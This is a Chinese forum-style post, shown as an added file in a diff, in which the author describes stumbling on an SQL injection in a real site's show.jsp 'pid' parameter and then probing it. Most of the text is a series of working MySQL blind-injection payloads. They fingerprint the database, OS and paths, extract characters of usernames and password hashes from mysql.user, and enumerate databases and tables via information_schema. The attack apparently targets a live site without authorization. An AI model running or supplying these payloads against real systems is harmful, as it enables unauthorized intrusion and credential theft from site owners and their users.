@@ -1,0 +1,76 @@
+    看新闻的时候弹出一个页面
+  [hide]还是不给地址吧，影象不好！:loveliness: [/hide]
+   一看是连接很眼熟嘛。顺手就
+and 1=1
+and 1=11
+竟然存在注入
+/show.jsp?pid=6635%23%20and%201=1aaaaaaaa99999999  正常
+show.jsp?pid=6635--99999999       错误
+show.jsp?pid=6635/*99999999       错误
+ and (select count(*) from sysobjects)>0  错误
+ and (select count(table_name) from user_tables)%3E0  错误
+
+jsp的站，一般就是oracle，mysql，mssql少数其他数据库。
+经过几次判断确定是mysql库.
+
+order by 1 正常 ，order by 2 错误
+ and 1=2 union select 1 出错
+and 1=2 union select unhex(hex(user()))  出错
+and 1=2 union select null  出错  
+and 1=2 union select 0  出错
+看来union 不能用了。只能盲注。。。
+
+and char_length(database())%3C=32 and 1%3C2    数据库名的长度
+ and ascii(substring(database(),1,1))%3C=256 and 1%3C2    数据库名第一位的ACSII  eMarket
+
+and char_length(@@basedir)%3E32 and 1%3C2                         数据库物理路径内容长度
+ and (select ascii(substring(@@datadir, 1, 1)))=47 and 1%3C2  数据库物理路径/usr/local/mysql/
+
+ and ascii(substring(@@version_compile_os,1,1))=108 and 1%3C2        unknown-linux-gnu 系统版本
+
+ and ascii(substring(user(),1,1))=49 and 1%3C2                       [email]system@10.11.5.19[/email]  数据库用户名
+
+ and ascii(substring(system_user(),1,1))%3E32 and 1%3C2   
+
+ and ascii(substring(session_user(),1,1))%3E60 and 1%3C2             [email]system@10.11.5.19[/email]
+
+ and char_length(current_user())%3E32 and 1%3C2                      [email]system@10.11.5.19[/email]
+
+ and ascii(substring(@@basedir,1,1))%3E40 and 1%3C2       不解释了，语法很简单
+
+ and (select char_length(count(*)) from mysql.user )%3E32 and 1%3C2   user表的记录数
+
+ and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)%3E2 and 1%3C2    user表，第一个用户名长度
+
+ and (select ascii(substring(user,1,1)) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)%3E100 and 1%3C2  user表，第一个用户名第一位的ASC码
+
+
+ and (select ascii(substring(password,1,1)) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)=42 and 1%3C2    
+
+ and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)%3E88 and 1%3C2  
+
+ and (select char_length(count(*)) from (select * from information_schema.tables group by table_schema order by table_schema)t limit 1)%3C=32 and 1%3C2    schema中的数据库记录数长度
+
+ and (select ascii(substring(count(*),1,1)) from (select * from information_schema.tables group by table_schema order by table_schema)t limit 1)%3C=256 and 1%    
+
+ and (select char_length(table_schema) from (select * from (select * from information_schema.tables group by table_schema order by table_schema limit 0,1) t order by table_schema desc)t limit 1)%3C=32 and 1%3C2   第一个数据库名的长度
+
+ and (select ascii(substring(table_schema,1,1)) from (select * from (select * from information_schema.tables group by table_schema order by table_schema limit 0,1) t order by table_schema desc)t limit 1)%3E112 and 1%3C2 
+第一个数据库名的第一位ASC码
+要一位一位的猜ASC码。所以表段也就不再继续了。
+看到这应该明白了，注入是不分脚本的，而是看数据库，根据数据库特性来注入。以后不要老问php，aspx怎么注入...
+内容我就不贴出来了。有兴趣的可以自己去测试下。可以跨库。。。
+
+
+and (select ascii(substring(database(),1,1))  )%3E115 and 1=1    数据库名：
+
+ and (select char_length(cast(count(*) as char)) from information_schema.tables where table_schema=database() limit 1)%3C=32 and 1=1    统计有多少个表
+
+ and (select char_length(cast(count(*) as char)) from information_schema.tables where table_schema=0x654d61726b6574 limit 1)%3C=32 and 1=1  统计有多少个表
+
+ and (select char_length(table_name) from (select * from (select * from information_schema.tables where table_schema=0x696E3839 order by table_schema limit 0,1) t order by table_schema desc)t limit 1)%3C=32 and 1=1   第一个表的长度的第一个ACSII码
+ 
+第一个表的的第一位的ACSII码：
+ and (select ascii(substring(table_name,1,1)) from (select * from (select * from information_schema.tables where table_schema=0x654d61726b6574 order by table_schema limit 0,1) t order by table_schema desc)t limit 1)%3C=256 and 1=1
+
+
